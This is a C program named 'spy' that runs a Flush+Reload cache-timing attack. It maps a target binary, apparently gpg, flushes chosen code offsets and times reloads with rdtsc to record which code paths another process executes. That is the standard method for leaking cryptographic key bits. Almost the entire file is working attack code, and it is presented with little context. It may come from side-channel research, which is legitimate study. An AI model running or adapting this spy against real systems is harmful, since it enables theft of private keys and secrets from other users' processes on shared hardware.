#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <assert.h>

#define NTIMING	100000
#define MAXPROBELOCATION 10
#define CUTOFF 150

#define MAXLINELEN 512

static inline unsigned long gettime() {
  volatile unsigned long tl;
  asm __volatile__("lfence\nrdtsc" : "=a" (tl): : "%edx");
  return tl;
}

static inline void flush(char *addrs) {
  asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (addrs) :);
}

static inline int probe(char *adrs) {
  volatile unsigned long time;

  asm __volatile__ (
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    "  clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}



struct probe_info
{
  int noffsets;
  unsigned long offsets[MAXPROBELOCATION];
  char symbol[MAXPROBELOCATION];
  unsigned long base;
};

struct arguments
{
  struct probe_info addr;
  char fileName[100];
};

void printArguments(struct arguments* args){

  printf("\n\n\n------------- PRINTING ARGUMENTS -------------------\n\n");
  printf("fileName of gpg = %s\n", args->fileName);
  printf("noffsets = %d\n", args->addr.noffsets);

  for (int i = 0; i < args->addr.noffsets; ++i)
  {
    printf("offsets = %lu ", *(args->addr.offsets+i) );
    printf("chars = %c\n", *(args->addr.symbol+i) );
  }

  printf("base = %lu\n", args->addr.base);

    printf("\n\n------------- END OF PRINT-------------------\n\n\n");


return;
}

int readArgs(const char* file,struct arguments* args){

  FILE *fd = fopen(file,"r");

  if(fd == NULL){
    printf("file not found/doesn't exist\n");
    return -1;
  }





  char line[MAXLINELEN];

  while (fgets(line,MAXLINELEN,fd) != NULL){


    char *identifier = strtok(line, " \n");

    if(identifier == NULL){
      continue;
    }

    if(strcmp(identifier,"map") == 0){

      char* binaryfile = strtok(NULL, " \n");
      strcpy(args->fileName,binaryfile);

      continue;
    }

    else if (strcmp(identifier,"offset") == 0)
    {
      char* addressoffset = strtok(NULL, " \n");
      char* character = strtok(NULL, " \n");

      if(character == NULL || addressoffset == NULL){
        printf("Invalid offset or character representing it\n");
        return -1;
      }

      args->addr.offsets[args->addr.noffsets] =  (unsigned long)strtol(addressoffset, NULL, 0); 
      args->addr.symbol[args->addr.noffsets] = character[0];
      args->addr.noffsets++;

      continue;
    }

    else if (strcmp(identifier,"base") == 0)
    {
      char* addressbase = strtok(NULL, " \n");

      if(addressbase == NULL){
        printf("Invalid base address\n");
        return -1;
      }

      args->addr.base =  (unsigned long)strtol(addressbase, NULL, 0); 
      continue;
    }

    else{
      printf("Invalid indentifier\n");
      return -1;
    }

  }

  fclose(fd);

  if(args->fileName == NULL){
    printf("no binaryfile provided\n");

    return -1;
  }
  if(args->addr.noffsets == 0){
    printf("no offset provided\n");
    return -1;
  }

  printArguments(args);

  return 1;

}


int main(int argc, char const *argv[])
{

  if (argc < 3)
  {
    printf("usage: ./spy <argument-file> <slot-size>\n");
    exit(1);
  }

  struct arguments * args = malloc (sizeof (struct arguments));
 

  int x = readArgs(argv[1],args);
  if (x != 1){
    printf("ERROR: arguments reading failed\n");
    exit(1);
  }

  int slotSize = atoi(argv[2]);


     int fd = open(args->fileName, O_RDONLY);
     if( fd < 0){
      printf("ERROR: binaryfile not found at given location\n");
      exit(1);
     }


     struct stat file_stats;
     fstat(fd, &file_stats);
     int size = file_stats.st_size;

     void *binaryMapAddr = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0); // MAP_PRIVATE 
     close(fd);


  int numAddress = args->addr.noffsets;

  char * probe_locations[numAddress];

  for (int i = 0; i < numAddress; i++){
    probe_locations[i] = malloc(sizeof (char*)) ;
    probe_locations[i] = binaryMapAddr + ((args->addr.offsets[i] - args->addr.base) & ~0x3f);
  }

   int probe_timing[numAddress];
  int isProbe_hit[numAddress];


  unsigned int slotstart;
  unsigned int currenttime;
  int hit;
  int debug = 1;


  for (int i = 0; i < numAddress; i++){
    printf("%lu\n",probe_locations[i]-(char *)binaryMapAddr);

    flush(probe_locations[i]);
  }

  for(int i = 0; i < 1000; i++){
    for (int i = 0; i < numAddress; i++) {
          probe_timing[i] = probe(probe_locations[i]);
        //   printf("%d ",probe_timing[i] );
      }
      //printf("\n");
  }

 // printf("END OR MEM ACCESE TIME\n\n\n\n");
  slotstart = gettime();

  long long unsigned int probeNum = 0;

  long long unsigned locs[1000000]; 

  time_t t1 = time(NULL);

  int ctr = 0 ; 

  while (time(NULL) - t1 < 5) {
      hit = 0;
      probeNum++;
      for (int i = 0; i < numAddress; i++) {
          probe_timing[i] = probe(probe_locations[i]);
          isProbe_hit[i] = (probe_timing[i] < CUTOFF);
          hit |= isProbe_hit[i];
       currenttime = gettime();
       while (currenttime - slotstart < slotSize){
                  currenttime = gettime();            
       }       
       slotstart = gettime();
      }
      int isPrint = 0;
     if(isProbe_hit[0] || isProbe_hit[1] || isProbe_hit[2]){
            isPrint = 1;
       }

    if(isPrint == 1){
   

      for (int i = 0; i < numAddress; i++) {
          locs[ctr++] = (long long unsigned ) probe_timing[i] ;  
      }
     }
  }


  for (int j=0;j<ctr;j = j+3){
    printf("%llu %llu %llu\n",locs[j],locs[j+1],locs[j+2]) ;
  }


printf("%d\n", ctr/3);
}

